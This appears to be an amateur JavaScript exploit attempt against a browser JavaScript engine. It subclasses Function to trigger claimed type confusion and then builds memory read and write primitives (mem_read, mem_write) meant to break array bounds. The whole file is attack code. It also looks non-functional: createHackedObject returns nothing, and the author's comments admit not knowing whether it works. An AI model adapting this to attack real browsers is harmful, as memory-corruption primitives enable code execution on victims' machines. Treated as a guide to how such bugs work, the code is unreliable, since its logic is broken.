class haxType extends Function {
    constructor() {
        super();
        super.prototype = 1;
    }
}

var victim;
var altMethod = false;

// type confusion at its finest, ex: var mem = createHackedObject(new Int32Array(1)); and it forgets the rules of array bounds (type confussion example)
function createHackedObject(val) {
    const targ = new haxType();
    try { targ.__defineGetter__("prototype", () => {}); } catch {}
    targ.prototype.x = val; 
}

function rwCheck() {
    victim[80] = 0x414141;
    if (victim[80] == 0x414141) {
        console.log("method 1 works...");
    } else {
        console.log("using alt mem r/w method (idk if it work)");
        altMethod = true;
    }
}

function initRW() {
    victim = createHackedObject(new Uint8Array(1));
    rwCheck();
}

function mem_read(addr) {
    victim[0] = addr; // butterfly addr thing may help idk im actually stupid

    if (!altMethod) {
        return victim[addr];
    } else {
        return victim[addr].prototype.x; // double type confusion lol
    }
}

function mem_write(addr, val) {
    if (!altMethod) {
        victim[addr] = val;
    } else {
        try {
          victim[addr].prototype = val; // may help idk
        } catch {}
        victim[addr].prototype.x = val;
    }
}
